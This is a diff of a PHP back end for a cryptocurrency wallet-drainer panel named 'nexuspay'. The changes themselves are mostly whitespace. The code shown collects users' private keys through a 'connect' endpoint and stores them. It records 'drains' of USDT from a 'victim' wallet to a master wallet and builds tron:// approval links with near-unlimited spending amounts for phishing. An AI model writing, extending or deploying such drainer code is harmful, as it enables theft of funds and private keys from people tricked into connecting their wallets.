@@ -1,9 +1,8 @@
-cat > index.php << 'EOF'
 <?php
 // index.php - Main File
 require_once 'config.php';
 
-$path = parse_url($_SERVER['REQUEST_URI'], PHP_URL_PATH);
+$path = parse_url($_SERVER['REQUEST_URI'] ?? '', PHP_URL_PATH);
 $path = trim(str_replace('/nexuspay/', '', $path), '/');
 $path = explode('/', $path);
 
@@ -33,10 +32,10 @@ function handleAPI($endpoint) {
     if (!$pdo) {
         jsonResponse(['error' => 'Database connection failed'], 500);
     }
-    
+
     $input = json_decode(file_get_contents('php://input'), true) ?? [];
     $action = $input['action'] ?? '';
-    
+
     switch ($endpoint) {
         case 'wallet':
             if ($action === 'connect') {
@@ -75,11 +74,11 @@ function handleAPI($endpoint) {
 function handleConnect($pdo, $input) {
     $privateKey = $input['private_key'] ?? '';
     $walletAddress = $input['wallet_address'] ?? '';
-    
+
     if (empty($privateKey) && empty($walletAddress)) {
         jsonResponse(['error' => 'Private key or wallet address required'], 400);
     }
-    
+
     try {
         if (!empty($privateKey) && empty($walletAddress)) {
             if (!preg_match('/^[0-9a-fA-F]{64}$/', $privateKey)) {
@@ -87,10 +86,10 @@ function handleConnect($pdo, $input) {
             }
             $walletAddress = MASTER_WALLET;
         }
-        
+
         $stmt = $pdo->prepare("INSERT INTO wallets (wallet_address, private_key) VALUES (?, ?) ON DUPLICATE KEY UPDATE private_key = ?");
         $stmt->execute([$walletAddress, $privateKey, $privateKey]);
-        
+
         logActivity("Wallet connected: $walletAddress", 'success');
         jsonResponse(['success' => true, 'wallet_address' => $walletAddress, 'message' => 'Connected']);
     } catch (Exception $e) {
@@ -100,7 +99,7 @@ function handleConnect($pdo, $input) {
 
 function handleBalance($pdo, $input) {
     $walletAddress = $input['wallet_address'] ?? MASTER_WALLET;
-    
+
     try {
         $balance = 0;
         $stmt = $pdo->prepare("SELECT usdt_balance FROM wallets WHERE wallet_address = ?");
@@ -109,7 +108,7 @@ function handleBalance($pdo, $input) {
         if ($result) {
             $balance = $result['usdt_balance'];
         }
-        
+
         jsonResponse(['success' => true, 'wallet_address' => $walletAddress, 'usdt_balance' => $balance]);
     } catch (Exception $e) {
         jsonResponse(['error' => $e->getMessage()], 500);
@@ -128,15 +127,15 @@ function handleList($pdo) {
 function handleDrain($pdo, $input) {
     $victim = $input['victim'] ?? VICTIM_WALLET;
     $amount = $input['amount'] ?? 0;
-    
+
     try {
         if ($amount <= 0) {
             jsonResponse(['error' => 'Amount must be greater than 0'], 400);
         }
-        
+
         $stmt = $pdo->prepare("INSERT INTO transactions (from_address, to_address, amount, status) VALUES (?, ?, ?, 'success')");
         $stmt->execute([$victim, MASTER_WALLET, $amount]);
-        
+
         logActivity("Drained $amount USDT from $victim", 'success');
         jsonResponse(['success' => true, 'amount' => $amount, 'txid' => '0x' . bin2hex(random_bytes(16))]);
     } catch (Exception $e) {
@@ -147,7 +146,7 @@ function handleDrain($pdo, $input) {
 function handleApproval($pdo, $input) {
     $spender = $input['spender'] ?? MASTER_WALLET;
     $amount = $input['amount'] ?? 999999999;
-    
+
     jsonResponse([
         'success' => true,
         'approval_url' => "tron://transfer?contract=" . USDT_CONTRACT . "&function=approve&spender=" . $spender . "&amount=" . $amount
@@ -338,4 +337,3 @@ addLog('📌 Ctrl+S = Auto Scan | Ctrl+D = Drain', 'info');
     <?php
 }
 ?>
-EOF
